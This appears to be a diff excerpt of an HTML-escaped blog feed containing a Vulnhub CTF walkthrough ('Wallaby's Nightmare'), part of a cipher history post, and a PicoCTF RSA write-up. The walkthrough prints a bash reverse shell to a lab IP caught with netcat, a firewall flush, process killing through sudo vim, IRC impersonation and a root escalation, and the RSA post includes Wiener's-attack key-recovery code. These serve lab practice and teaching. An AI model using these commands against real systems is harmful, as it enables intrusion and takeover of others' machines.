+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.101] 59808
+Linux ubuntu 4.4.0-31-generic &lt;span class=&quot;c&quot;&gt;#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+ 08:07:00 up 53 min,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+waldo    pts/0    tmux&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;642&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.%0     07:13   53:39   0.64s  0.64s irssi
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+$ python -c '&lt;/span&gt;import pty; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
+www-data@ubuntu:/$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we're connected! Running &lt;b&gt;sudo -l&lt;/b&gt; gives us information that we can run &lt;b&gt;iptables&lt;/b&gt; as &lt;b&gt;www-data&lt;/b&gt; and &lt;b&gt;vim&lt;/b&gt; with certain file as &lt;b&gt;waldo&lt;/b&gt; user. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@ubuntu:/$ &lt;/span&gt;sudo -l
+sudo -l
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on ubuntu:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;waldo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/iptables&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Remember that &lt;b&gt;IRC&lt;/b&gt; port that came up during the first scan? It was filtered, so flushing the iptables may allow us to connect. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@ubuntu:/$ &lt;/span&gt;sudo iptables -F
+sudo iptables -F&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now, let's check that by running another Nmap scan. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap 192.168.56.101
+
+Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 11:32 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00017s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6667/tcp open  irc
+MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.29 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, it's open! Let's connect to it using &lt;b&gt;HexChat&lt;/b&gt;. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/irc-first-look.png&quot; alt=&quot;First look at IRC&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;List of commands, let's take a look at them! &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/irc-commands.png&quot; alt=&quot;IRC commands&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Best option to gain his identity, would be kicking him from the chat. But how? Firstly we can take a look at the current processes running as waldo user. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@ubuntu:/$ &lt;/span&gt;ps -aux | grep waldo
+ps -aux | grep waldo
+waldo      642  0.0  0.2  29416  3024 ?        Ss   07:13   0:00 tmux new-session -d -s irssi
+waldo      687  0.0  0.0   4508   784 pts/0    Ss   07:13   0:00 -sh
+waldo      733  0.0  0.8 115744  8484 pts/0    Sl+  07:13   0:01 irssi
+www-data  1414  0.0  0.0  11284   944 pts/1    S+   08:43   0:00 grep waldo&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let's remember the number of irssi process - 773. Now we can use vim to kill the process. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@ubuntu:/$ &lt;/span&gt;sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
+&amp;lt;waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf            
+
+E558: Terminal entry not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;terminfo
+&lt;span class=&quot;s1&quot;&gt;'unknown'&lt;/span&gt; not known. Available &lt;span class=&quot;nb&quot;&gt;builtin &lt;/span&gt;terminals are:
+    builtin_amiga
+    builtin_beos-ansi
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+defaulting to &lt;span class=&quot;s1&quot;&gt;'ansi'&lt;/span&gt;
+
+:!kill 733st &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:60080&amp;gt;
+        &lt;span class=&quot;c&quot;&gt;# The ServerName directive sets the request scheme, hostname and port th&lt;/span&gt;
+at
+        &lt;span class=&quot;c&quot;&gt;# the server uses to identify itself. This is used when creating&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# redirection URLs. In the context of virtual hosts, the ServerName&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# specifies what hostname must appear in the request's Host: header to&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# match this virtual host. For the default virtual host (this file) this&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# value is not decisive as it is used as a last resort host regardless.&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# However, you must set it for any further virtual host explicitly.&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;#ServerName www.example.com&lt;/span&gt;
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        &lt;span class=&quot;c&quot;&gt;# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,&lt;/span&gt;
+:!kill 733&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, a few moments later we can see that waldo has quit. We can now quickly change our name to his using &lt;b&gt;/nick waldo&lt;/b&gt; command, and fortunately, we'll be able to execute &lt;b&gt;.run&lt;/b&gt; command. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; waldo has quit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; You are now known as waldo
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;waldo&amp;gt; &lt;/span&gt;.run whoami
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;wallabysbot&amp;gt; &lt;/span&gt;b&lt;span class=&quot;s1&quot;&gt;'wallaby'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Firstly let's start the listener on port 8080. Now let's enter this useful trick, which will provide us with a shell. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;waldo&amp;gt; &lt;/span&gt;.run bash -c &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.102/8080 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nc -nlvp 8080
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.101] 57524
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;624&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+&lt;span class=&quot;gp&quot;&gt;wallaby@ubuntu:~$ &lt;/span&gt;sudo -l
+sudo -l
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;wallaby on ubuntu:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User wallaby may run the following commands on ubuntu:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: ALL &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In addition we can freely use sudo. Amazing! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;wallaby@ubuntu:~$ &lt;/span&gt;sudo su
+sudo su
+whoami
+root
+ls
+www
+ls -la
+total 52
+drwxr-xr-x 8 wallaby wallaby 4096 Dec 16  2016 .
+drwxr-xr-x 5 root    root    4096 Dec 16  2016 ..
+-rw------- 1 wallaby wallaby    1 Dec 30  2016 .bash_history
+-rw-r--r-- 1 wallaby wallaby  220 Dec 16  2016 .bash_logout
+-rw-r--r-- 1 wallaby wallaby 3771 Dec 16  2016 .bashrc
+drwx------ 3 wallaby wallaby 4096 Dec 16  2016 .cache
+drwx------ 2 wallaby wallaby 4096 Dec 16  2016 .irssi
+drwx------ 4 wallaby wallaby 4096 Dec 16  2016 .local
+drwxrwxr-x 2 wallaby wallaby 4096 Dec 16  2016 .nano
+-rw-r--r-- 1 wallaby wallaby  655 Dec 16  2016 .profile
+-rw-rw-r-- 1 wallaby wallaby   66 Dec 16  2016 .selected_editor
+drwxrwxr-x 4 wallaby wallaby 4096 Dec 30  2016 .sopel
+-rw-r--r-- 1 wallaby wallaby    0 Dec 16  2016 .sudo_as_admin_successful
+drwxrwxr-x 3 wallaby wallaby 4096 Dec 16  2016 www
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+ls -la
+total 48
+drwx------  4 root root 4096 Dec 27  2016 .
+drwxr-xr-x 22 root root 4096 Dec 14  2016 ..
+drwxr-xr-x  2 root root 4096 Dec 27  2016 backups
+-rw-------  1 root root    1 Dec 27  2016 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+-rwxr-xr-x  1 root root  510 Dec 27  2016 check_level.sh
+-rw-r--r--  1 root root  342 Dec 16  2016 flag.txt
+-rw-------  1 root root   18 Dec 15  2016 .mysql_history
+drwxr-xr-x  2 root root 4096 Dec 15  2016 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Dec 15  2016 .selected_editor
+-rw-r--r--  1 root root  214 Dec 16  2016 .wget-hsts
+cat flag.txt
+&lt;span class=&quot;c&quot;&gt;###CONGRATULATIONS###&lt;/span&gt;
+
+You beat part 1 of 2 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the &lt;span class=&quot;s2&quot;&gt;&quot;Wallaby's Worst Knightmare&quot;&lt;/span&gt; series of vms!!!!
+
+This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!
+
+Come to IRC and contact me &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you find any errors or interesting ways to root, I&lt;span class=&quot;s1&quot;&gt;'d love to hear about it.
+
+Thanks guys!
+-Waldo&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here we have the final flag, and the game is over. It was anothers great and educational machine from &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;Vulnhub&lt;/a&gt;. Thanks &lt;a href=&quot;https://www.arashparsa.com/&quot;&gt;Waldo&lt;/a&gt;!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction Today we're going to play with another machine called Wallaby's: Nightmare. Here's the description:</summary></entry><entry><title type="html">Dudek - Polish Cipher Machine</title><link href="http://localhost:4000/tgs-1-dudek/" rel="alternate" type="text/html" title="Dudek - Polish Cipher Machine" /><published>2017-07-04T10:00:00+02:00</published><updated>2017-07-04T10:00:00+02:00</updated><id>http://localhost:4000/tgs-1-dudek</id><content type="html" xml:base="http://localhost:4000/tgs-1-dudek/">&lt;h1&gt;Let's hear the history&lt;/h1&gt;
 
 &lt;p&gt;Everyone should have heard about involvment of Polish cryptographers in breaking Enigma. But there's another great story containing cryptography - &lt;b&gt;DUDEK&lt;/b&gt; cipher machine. &lt;/p&gt;
 
@@ -1555,96 +2009,4 @@ w3ndige@W3ndige ~&amp;gt; chgrp GROUP FILE&lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
 
 &lt;p&gt;&lt;i&gt;modern life nearly conspires against the collective. we are tormented by a relentless flow of information as well as the daily worries of an eternally insecure, unwarranted life. furthermore, we dread the thought of being alive, of sharing multiple views and opinions. as such, we are turning progressively judgemental of who we should be partnering with, on the basis that &quot;they do not understand&quot;. in hacking, it yet implicates on the delicate subject of trust, which would require an essay on itself, given the undeniable importance the matter has acquired over the years.&lt;/i&gt;&lt;/p&gt;
 
-&lt;p&gt;Great, we broke the cipher and got the message! Thanks &lt;a href=&quot;http://www.phrack.org/issues/69/6.html#article&quot;&gt;Phrack&lt;/a&gt;! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Cryptography" /><summary type="html">Introduction</summary></entry><entry><title type="html">PicoCTF - SmallRSA</title><link href="http://localhost:4000/picoctf-smallrsa/" rel="alternate" type="text/html" title="PicoCTF - SmallRSA" /><published>2017-04-19T02:00:00+02:00</published><updated>2017-04-19T02:00:00+02:00</updated><id>http://localhost:4000/picoctf-smallrsa</id><content type="html" xml:base="http://localhost:4000/picoctf-smallrsa/">&lt;h1&gt;SmallRSA - 120 PTS&lt;/h1&gt;
-
-&lt;p&gt;You intercepted a single message. However, it appears to be encrypted. Can you decrypt it? Message&lt;/p&gt;
-
-&lt;p&gt;Hint: &lt;i&gt;Normally, you pick e and generate d from that. What appears to have happened in this case? What is likely about the size of d?&lt;/i&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;e = 165528674684553774754161107952508373110624366523537426971950721796143115780129435315899759675151336726943047090419484833345443949104434072639959175019000332954933802344468968633829926100061874628202284567388558408274913523076548466524630414081156553457145524778651651092522168245814433643807177041677885126141
-n = 380654536359671023755976891498668045392440824270475526144618987828344270045182740160077144588766610702530210398859909208327353118643014342338185873507801667054475298636689473117890228196755174002229463306397132008619636921625801645435089242900101841738546712222819150058222758938346094596787521134065656721069
-c = 84740524770381403153622925447792920959815469600692319965596776738431504244164788253920072346154965475345520986566261139605189850053220984036986688956922312943484012082747435674795128749623149324459566588589685250817942108728364336944750553593289462772627326115549452684668188298340307743571301091011089977112&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Okay, they're giving us a hint about a size of a &lt;b&gt;d&lt;/b&gt;. The one thing that comes to my mind is that, if &lt;b&gt;d &amp;lt; 1/3 * N^(1/4)&lt;/b&gt;, Wiener's attack would be a great option to break this crypto. It uses the continued fraction method to expose the private key &lt;b&gt;d&lt;/b&gt;, but only when &lt;b&gt;d&lt;/b&gt; is small. You can read more about it in this &lt;a href=&quot;https://www.iacr.org/archive/pkc2004/29470001/29470001.pdf&quot;&gt;paper&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;i&gt;In the RSA Cryptosystem, Bob might tend to use a small value of d, rather than a large random number to improve the RSA decryption performance. However, Wiener’s attack shows that choosing a small value for d will result in an insecure system in which an attacker can recover all secret information, i.e., break the RSA system. &lt;/i&gt;&lt;/p&gt;
-
-&lt;p&gt;Now we have to apply these information to our message values. I've found this piece of code made by &lt;a href=&quot;https://github.com/pablocelayes/rsa-wiener-attack&quot;&gt;pablocelayes&lt;/a&gt;. Thanks! &lt;/p&gt;
-
-&lt;p&gt;I'm presenting here code used for only attacking, Arithmetic and ContinuedFractions modules are loaded from external files, so make sure to check out the Github Repository to get all the essential code. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ContinuedFractions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Arithmetic&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hack_RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'''
-    Finds d knowing (e,n)
-    applying the Wiener continued fraction attack
-    '''&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;frac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ContinuedFractions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rational_to_contfrac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;convergents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ContinuedFractions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convergents_from_contfrac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convergents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-
-        &lt;span class=&quot;c&quot;&gt;#check if d is actually the key&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;phi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-            &lt;span class=&quot;c&quot;&gt;# check if the equation x^2 - s*x + n = 0&lt;/span&gt;
-            &lt;span class=&quot;c&quot;&gt;# has integer roots&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;discr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;discr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Arithmetic&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_perfect_square&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;discr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hacked!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# TEST functions&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_hack_RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
